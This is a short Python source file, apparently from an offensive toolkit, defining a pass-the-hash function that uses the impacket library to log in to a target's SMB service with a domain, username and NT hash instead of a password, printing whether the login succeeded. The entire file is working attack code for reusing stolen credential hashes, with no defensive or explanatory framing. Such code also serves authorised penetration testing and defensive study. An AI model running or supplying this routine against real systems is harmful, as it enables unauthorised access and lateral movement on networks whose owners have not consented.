from impacket.smbconnection import SMBConnection
from colorama import Fore

def pass_the_hash(domain, username, nthash, target):
    print(Fore.YELLOW + f"[*] Trying SMB login with hash on {target} as {domain}\\{username}")
    try:
        conn = SMBConnection(target, target)
        conn.login(username, '', domain=domain, nthash=nthash)
        print(Fore.GREEN + "[+] PTH Success!")
        conn.logoff()
    except Exception as e:
        print(Fore.RED + f"[-] PTH Failed: {str(e)}")
